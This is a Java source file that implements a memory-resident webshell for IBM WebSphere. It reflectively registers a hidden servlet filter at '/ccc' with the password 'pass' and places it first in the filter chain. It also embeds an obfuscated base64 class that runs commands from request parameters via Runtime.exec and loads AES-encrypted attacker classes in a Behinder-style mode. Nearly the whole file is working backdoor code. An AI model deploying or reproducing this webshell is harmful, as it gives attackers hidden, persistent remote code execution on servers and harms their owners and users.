package com.memshell.websphere;

import sun.misc.BASE64Decoder;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.List;

public class FilterBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {

        try{
            String filterName = "myFilter3";
            String urlPattern = "/ccc";
            final String password = "pass";

            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            Object[] obj_arr = (Object[]) obj;
            for(int j = 0; j < obj_arr.length; j++){
                Object o = obj_arr[j];
                if(o == null) continue;

                if(o.getClass().getName().endsWith("WebContainerRequestState")){
                    Object request = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object servletContext = request.getClass().getMethod("getServletContext", new Class[0]).invoke(request, new Object[0]);

                    field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object context = field.get(servletContext);

                    field = context.getClass().getSuperclass().getDeclaredField("config");
                    field.setAccessible(true);
                    Object webAppConfiguration = field.get(context);

                    Method method = null;
                    Method[] methods = webAppConfiguration.getClass().getMethods();
                    for(int i = 0; i < methods.length; i++){
                        if(methods[i].getName().equals("getFilterMappings")){
                            method = methods[i];
                            break;
                        }
                    }
                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);

                    boolean flag = false;
                    for(int i = 0; i < filerMappings.size(); i++){
                        Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
                        String name = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }

                    //如果已存在同名的 Filter，就不在添加，防止重复添加
                    if(!flag){
                        System.out.println("[+] Add Dynamic Filter");

                        ClassLoader cl = Thread.currentThread().getContextClassLoader();
                        clazz = null;
                        try{
                            clazz = cl.loadClass("com.memshell.generic.DynamicFilterTemplate");
                        }catch(ClassNotFoundException e){
                            BASE64Decoder base64Decoder = new BASE64Decoder();
                            String codeClass = "yv66vgAAADIBUAoAOgCcCACdCQBVAJ4KAFUAnwkAoAChCACiCgCjAKQIAH8LAEAApQgApgoApwCoCgCnAKkHAKoKAKsArAoAqwCtCgCuAK8KAA0AsAgAsQoADQCyCgANALMLAEEAtAoAtQCkCAC2BwC3CgAYAJwIALgKABgAuQoAugC7CgAYALwKABgAvQgAvgoApwC/CgCnAMAHAMELACIAwggAwwsAxADFCgC1AMYIAMcKAMgAyQcAygsAxADLCgCnAMwKACkAzQoAyADOBwDPCgAuAJwLAEAA0AoA0QDSCgAuANMKAMgA1AkAVQDVCADWBwDXBwBxBwDYCgA2ANkHANoKANsA3AoA2wDdCgDeAN8KADYA4AgA4QcA4gcA4wcA5AoAQgDlCwDmAOcIAOgKADgA6QcA6goAOgDrCQDsAO0HAO4KADYA7wgA8AoA3gDxCgDsAPIHAPMKAE8A5QcA9AoAUQDlBwD1CgBTAOUHAPYHAPcBAAhwYXNzd29yZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAPgBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZyZXN1bHQBAANjbWQBAANrZXkBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQAEdHlwZQEADVN0YWNrTWFwVGFibGUHAPkHAOQBAAdkZXN0cm95AQAKaW5pdGlhbGl6ZQEAAmV4AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAFY2xhenoBAAZtZXRob2QBAARjb2RlAQAFYnl0ZXMBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAPYHANgHAOoHANcHAPoHAO4HAPMHAPQHAPUBAApTb3VyY2VGaWxlAQAaRHluYW1pY0ZpbHRlclRlbXBsYXRlLmphdmEMAFsAXAEABHBhc3MMAFcAWAwAhABcBwD7DAD8AP0BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcA/gwA/wBiDAEAAQEBAAViYXNpYwcA+QwA4QECDAEDAQQBABFqYXZhL3V0aWwvU2Nhbm5lcgcBBQwBBgEHDAEIAQkHAQoMAQsBDAwAWwENAQACXEEMAQ4BDwwBEAERDAESARMHARQBAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAEVARYHARcMARgBGQwBFQEaDAEbAREBAAEtDAEcAR0MAR4BHwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMASABIQEAAXUHASIMASMBJAwBJQBiAQADQUVTBwEmDAEnASgBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEpASoMASsBLAwAWwEtDABjAS4BABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEvATAHATEMATIBEQwBMwE0DAE1ATYMAFkAWgEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAE3ATgBABBqYXZhL2xhbmcvT2JqZWN0BwE5DAE6ATsMATwBPQcA+gwBPgE/DAFAAUEBAAZlcXVhbHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFCAFwHAUMMAGkBRAEAImNvbS5tZW1zaGVsbC5nZW5lcmljLk15Q2xhc3NMb2FkZXIMAUUBRgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFHAUgHAUkMAUoAWgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAUsBSAEDEHl2NjZ2Z0FBQURJQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNSTVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2pzQkFBRmpBUUFYVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQXRrWldacGJtVkRiR0Z6Y3dFQUxDaGJRa3hxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUZZbmwwWlhNQkFBSmJRZ0VBQzJOc1lYTnpURzloWkdWeUFRQUtVMjkxY21ObFJtbHNaUUVBRWsxNVEyeGhjM05NYjJGa1pYSXVhbUYyWVF3QUJnQUhBUUFpWTI5dEwyMWxiWE5vWld4c0wyZGxibVZ5YVdNdlRYbERiR0Z6YzB4dllXUmxjZ3dBRHdBYUFRQVZhbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNBSVFBQ0FBVUFBQUFBQUFJQUFBQUdBQWNBQVFBSUFBQUFPZ0FDQUFJQUFBQUdLaXUzQUFHeEFBQUFBZ0FKQUFBQUJnQUJBQUFBQkFBS0FBQUFGZ0FDQUFBQUJnQUxBQXdBQUFBQUFBWUFEUUFPQUFFQUNRQVBBQkFBQVFBSUFBQUFSQUFFQUFJQUFBQVF1d0FDV1N1M0FBTXFBeXErdGdBRXNBQUFBQUlBQ1FBQUFBWUFBUUFBQUFnQUNnQUFBQllBQWdBQUFCQUFFUUFTQUFBQUFBQVFBQk1BRGdBQkFBRUFGQUFBQUFJQUZRPT0MAUwBTQwBTgFPAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAKmNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5qYXZhL3V0aWwvVVVJRAEACnJhbmRvbVVVSUQBABIoKUxqYXZhL3V0aWwvVVVJRDsBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAFcHJpbnQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwAhAFUAOgABAFYAAgACAFcAWAAAAAIAWQBaAAAABgABAFsAXAABAF0AAABFAAIAAQAAAA8qtwABKhICtQADKrcABLEAAAACAF4AAAASAAQAAAAUAAQAFQAKABYADgAXAF8AAAAMAAEAAAAPAGAAYQAAAAEAWwBiAAEAXQAAAE4AAgACAAAADiq3AAEqK7UAAyq3AASxAAAAAgBeAAAAEgAEAAAAGgAEABsACQAcAA0AHQBfAAAAFgACAAAADgBgAGEAAAAAAA4AVwBYAAEAAQBjAGQAAgBdAAAANQAAAAIAAAABsQAAAAIAXgAAAAYAAQAAACIAXwAAABYAAgAAAAEAYABhAAAAAAABAGUAZgABAGcAAAAEAAEAaAABAGkAagACAF0AAALKAAcACgAAAZCyAAUSBrYABysSCLkACQIAOgQZBMYAUBkEEgq2AAuZAEYrKrQAA7kACQIAOgUZBcYAMhkFtgAMmgAquwANWbgADhkFtgAPtgAQtwAREhK2ABO2ABQ6Biy5ABUBABkGtgAWpwEuGQTGASEZBBIXtgALmQEXKyq0AAO5AAkCAMYARLsAGFm3ABkSGrYAG7gAHLYAHbYAHhIfEhq2ACAQELYAIToFK8AAIrkAIwEAEiQZBbkAJQMALLkAFQEAGQW2ACaxEie4ACg6BRkFBbsAKVm7ABhZtwAZK8AAIrkAIwEAEiS5ACoCALYAHRIatgAbtgAetgArEie3ACy2AC0ZBbsALlm3AC8ruQAwAQC2ADG2ADK2ADM6Biq0ADQSNQW9ADZZAxI3U1kEEjhTtgA5AQW9ADpZAxkGU1kEuAA7tgA8U7YAPcAANjoHGQe2AD46CBkHEj8FvQA2WQMSQFNZBBJBU7YAOToJGQkZCAW9ADpZAytTWQQsU7YAPVenABU6BRkFtgBDpwALLSssuQBEAwCxAAIAcwDAAX0AQgDBAXoBfQBCAAMAXgAAAGoAGgAAACYACAAoABIAKQAhACoALQArADoALABWAC0AYQAvAHMAMQCAADIAowAzALUANADAADUAwQA4AMgAOQD8ADoBFgA7AUgAPAFPAD0BZgA+AXoAQQF9AD8BfwBAAYQAQQGHAEMBjwBFAF8AAACOAA4AVgALAGsAWAAGAC0ANABsAFgABQCjAB4AbQBYAAUAyACyAG4AbwAFARYAZABwAHEABgFIADIAcgBaAAcBTwArAHMAdAAIAWYAFAB1AHYACQF/AAUAdwB4AAUAAAGQAGAAYQAAAAABkAB5AHoAAQAAAZAAewB8AAIAAAGQAH0AfgADABIBfgB/AFgABACAAAAAFAAG/ABhBwCBAvsAXPcAuwcAggkHAGcAAAAGAAIAUQBoAAEAgwBcAAEAXQAAACsAAAABAAAAAbEAAAACAF4AAAAGAAEAAABKAF8AAAAMAAEAAAABAGAAYQAAAAIAhABcAAEAXQAAAgMABwAHAAAAqbgAO7YAPEwqKxJFtgBGtQA0pwB/TSu2AEhOAToEGQTHADMtEjqlAC0tEjUGvQA2WQMSN1NZBLIASVNZBbIASVO2ADk6BKf/2DoFLbYAS06n/84STDoFuwAuWbcALxkFtgAyOgYZBAS2AE0qGQQrBr0AOlkDGQZTWQQDuABOU1kFGQa+uABOU7YAPcAANrUANKcAGEwrtgBQpwAQTCu2AFKnAAhMK7YAVLEABQAHABEAFABHACgARQBIAEoAAACQAJMATwAAAJAAmwBRAAAAkACjAFMAAwBeAAAAagAaAAAATgAHAFAAEQBgABQAUQAVAFIAGgBTAB0AVAAoAFYARQBZAEgAVwBKAFgATwBZAFIAXABWAF0AZABeAGoAXwCQAGcAkwBhAJQAYgCYAGcAmwBjAJwAZACgAGcAowBlAKQAZgCoAGgAXwAAAHAACwBKAAUAhQCGAAUAGgB2AIcAWgADAB0AcwCIAHYABABWADoAiQBYAAUAZAAsAIoAcQAGABUAewB3AIsAAgAHAIkAjACNAAEAlAAEAHcAjgABAJwABAB3AI8AAQCkAAQAdwCQAAEAAACpAGAAYQAAAIAAAAA6AAn/ABQAAgcAkQcAkgABBwCT/gAIBwCTBwCUBwCVagcAlgn/AD0AAQcAkQAAQgcAl0cHAJhHBwCZBAABAJoAAAACAJs=";
                            byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                            method = null;
                            Class clz = cl.getClass();
                            while(method == null && clz != Object.class ){
                                try{
                                    method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                }catch(NoSuchMethodException ex){
                                    clz = clz.getSuperclass();
                                }
                            }
                            method.setAccessible(true);
                            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                        }

                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
                        Object filter = clazz.getDeclaredConstructor(String.class).newInstance(password);
                        filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for(int i = 0; i < methods.length; i++){
                            if(methods[i].getName().equals("addFilterInfo")){
                                method = methods[i];
                                break;
                            }
                        }
                        method.invoke(webAppConfiguration, new Object[]{filterConfig});

                        field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
                        field.setAccessible(true);
                        Object original = field.get(filterConfig);

                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
                        field.set(filterConfig, null);

                        method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});

                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
                        field.set(filterConfig, original);

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for(int i = 0; i < methods.length; i++){
                            if(methods[i].getName().equals("getUriFilterMappings")){
                                method = methods[i];
                                break;
                            }
                        }

                        //这里的目的是为了将我们添加的动态 Filter 放到第一位
                        List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);
                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
                    }

                    break;
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}